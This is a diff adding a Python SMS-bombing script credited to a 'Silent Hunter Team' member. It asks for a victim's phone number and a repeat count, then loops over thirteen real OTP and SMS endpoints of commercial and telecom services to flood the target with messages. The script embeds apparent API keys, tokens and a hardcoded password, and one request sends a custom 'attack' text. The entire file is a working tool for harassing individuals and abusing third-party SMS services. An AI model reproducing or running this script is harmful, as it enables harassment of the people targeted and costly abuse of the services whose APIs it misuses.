@@ -1,0 +1,230 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+green = '\033[1;32m'
+end = '\033[0m'
+print (green+"""  _ _______                                   
+ (_)__   __|                                  
+  _   | |____                                 
+ | |  | |_  /                                 
+ | |  | |/ /                                  
+ |_|__|_/___|            _______              
+  / ____(_) |           |__   __|             
+ | (___  _| |     ___ _ __ | |                
+  \___ \| | |    / _ \ '_ \| |                
+  ____) | | |___|  __/ | | | |                
+ |_____/|_|______\___|_|_|_|_|                
+ | |  | |        |__   __|                    
+ | |__| |_   _ _ __ | | ___ _ __              
+ |  __  | | | | '_ \| |/ _ \ '__|             
+ | |  | | |_| | | | | |  __/ |                
+ |_|__|_|\__,_|_| |_|_|\___|_|                
+ |__   __|       |  \/  |                     
+    | | ___  __ _| \  / |                     
+    | |/ _ \/ _` | |\/| |                     
+    | |  __/ (_| | |  | |                     
+    |_|\___|\__,_|_|  |_|                     
+    _  _      _____ _    _       _  ___ ____  
+  _| || |_   / ____| |  | |     | |/ (_)  _ \ 
+ |_  __  _| | (___ | |__| | __ _| ' / _| |_) |
+  _| || |_   \___ \|  __  |/ _` |  < | |  _ < 
+ |_  __  _|  ____) | |  | | (_| | . \| | |_) |
+   |_||_|   |_____/|_|  |_|\__,_|_|\_\_|____/ 
+    _  _          _       _   _               
+  _| || |_       | |     | \ | |              
+ |_  __  _|      | | ___ |  \| |_   _         
+  _| || |_   _   | |/ _ \| . ` | | | |        
+ |_  __  _| | |__| | (_) | |\  | |_| |        
+   |_||_|    \____/ \___/|_| \_|\__, |        
+    _  _      _____       _  _   __/ |____    
+  _| || |_   / ____|     (_)(_) |___/  __ \   
+ |_  __  _| | (___   __ _ _  _  __ _| |  | |  
+  _| || |_   \___ \ / _` | || |/ _` | |  | |  
+ |_  __  _|  ____) | (_| | || | (_| | |__| |  
+   |_||_|   |_____/ \__,_| || |\__,_|_____/   
+                        _/ |/ |               
+    _  _     _____  _  |__/__/ _       _____  
+  _| || |_  |  __ \(_)   | |  | |     |  __ \ 
+ |_  __  _| | |__) |_ ___| |__| | __ _| |  | |
+  _| || |_  |  _  /| / __|  __  |/ _` | |  | |
+ |_  __  _| | | \ \| \__ \ |  | | (_| | |__| |
+   |_||_|   |_|  \_\_|___/_|  |_|\__,_|_____/ 
+                                              
+                                              """+end)
+
+# CVALUE
+blue = '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan = "\033[96m"
+end = '\033[0m'
+print ("\033[32m")
+
+print ("	 -!-!- WeLcOmE-!-!- (SiLenT HunTer TeaM FaMiLy) ")
+
+
+print ("""
+          
+                       
+   ╔═════════════════════════════════╗
+   ║ AuTHor   : SHaKiiB ツ           ║
+   ║ FaCeBooK : iTzSHaKiiB           ║
+   ║ GitHuB   : iTzSHaKiB            ║
+   ╚═════════════════════════════════╝
+       
+ 
+  
+  
+""")
+
+number  = str(input("[>] TuMar aTTack NumBer Daw : "))
+
+amount = int(input("[>] TuMar aTTack ar PoriMaN LikHo : "))
+
+url1 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"
+
+url2 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number
+
+url3 = "https://prodapp.lifepharmacy.com:443/api/auth/request-otp?"
+
+headers3 = CaseInsensitiveDict()
+
+headers3["Content-Type"]= "application/json"
+
+data3 = """{
+	\"email\":\"\",
+	\"name\":\"\",
+	\"phone\":\"88"""+number+"""\",
+	\"smsChannel\":\"\"
+}"""
+
+url4 = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"]="application/json"
+
+data4 = """{
+  \"direct_login\": true,
+  \"user\": {
+    \"resend\": false,
+    \"login\": \"88"""+number+"""\",
+    \"type\": {
+      \"register\": true
+    }
+  }
+}"""
+
+url5 = "https://ss.binge.buzz/otp/send/login"
+
+headers5 = CaseInsensitiveDict()
+headers5["Content-Type"] = "application/x-www-form-urlencoded"
+
+data5 = "phone="+number
+
+url6 = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.23183502639972242&validationkey=466429644f202f6120572a682b495374"
+
+headers6 = CaseInsensitiveDict()
+headers6["Content-Type"] = "application/json;charset=UTF-8"
+headers6["x-deviceid"] = "web-d881a3b625c9fbbcaa2ae2ac2c8bb061"
+
+data6 = """{
+  \"data\": {
+    \"user\": {
+      \"generic\": {
+        \"userid\": \"88"""+number+"""\",
+        \"password\": \"niilahmed281\",
+        \"l10n\": \"en\",
+        \"acceptedtermsandconditions\": true
+      }
+    }
+  }
+}"""
+
+url7 = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88"+number
+
+headers7 = CaseInsensitiveDict()
+headers7["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
+headers7["User-Agent"]="gzip"
+
+url8 = "http://27.131.15.19/lstyle/api/lsotprequest"
+
+headers8 = CaseInsensitiveDict()
+
+headers8["Content-Length"]="48"
+
+headers8["Content-Type"]="application/json"
+
+data8 = """{
+  \"shortcode\": \"2494905\",
+  \"msisdn\": \"88"""+number+"""\"
+}"""
+
+
+url9 = "https://api.jslglobal.co/user-api/v3/send-otp?phone=%2B88"+number+"&jatri_token=J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
+
+headers9 = CaseInsensitiveDict()
+
+headers9["Content-Type"]="application/json"
+
+
+url10 = "https://api.bongo-solutions.com/auth/api/login/send-otp"
+
+headers10 = CaseInsensitiveDict()
+headers10["Content-Type"] = "application/json"
+
+data10 = """{
+  \"operator\": \"all\",
+  \"msisdn\": \"88"""+number+"""\"
+}"""
+
+url11 = "https://heriken.com/fontend/Login/otp_send"
+
+headers11 = CaseInsensitiveDict()
+headers11["Content-Type"] = "application/x-www-form-urlencoded"
+
+data11 = "phone="+number+"&c_name="
+
+url12 = "http://27.131.15.12/sdpdcg/SendSMS.aspx?sMSISDN=88"+number+"&sMsg= aTTack By (SiiLenT HunTer TeaM) &sShortcode=21200"
+
+url13 = "https://api.maya-apa.com/api/v5/app/send_otp?phone=88"+number+"&device_id=df180efb23ee233d&source=app&lat=0.00&long=0.00"
+
+headers13 = CaseInsensitiveDict()
+headers13["Content-Type"] = "application/json"
+headers13["Content-Length"] = "0"
+
+
+for i in range(amount):
+	try:
+		resp1 = requests.get(url1)
+		
+		resp2 = requests.get(url2)
+		
+		resp3 = requests.post(url3, headers=headers3,  data=data3)
+		
+		resp4 = requests.post(url4, headers=headers4,  data=data4)
+		
+		resp5 = requests.post(url5, headers=headers5, data=data5)
+		
+		resp6 = requests.post(url6, headers=headers6, data = data6)
+		
+		resp7 = requests.post(url7, headers=headers7)
+		
+		resp8 = requests.post(url8, headers=headers8, data= data8)
+		
+		resp9 = requests.post(url9, headers=headers9)
+		
+		resp10 = requests.post(url10, headers=headers10, data = data10)
+		
+		resp11 = requests.post(url11, headers=headers11, data = data11)
+		
+		resp12 = requests.get(url12)
+		
+		resp13 = requests.post(url13, headers=headers13)
+		
+		print(str (i+1)+" aTTack SenT \n")
+		
+	except:
+		print ("TuMar PHonE a NeT Nai....pHonE neTwOrk a RakHo...")
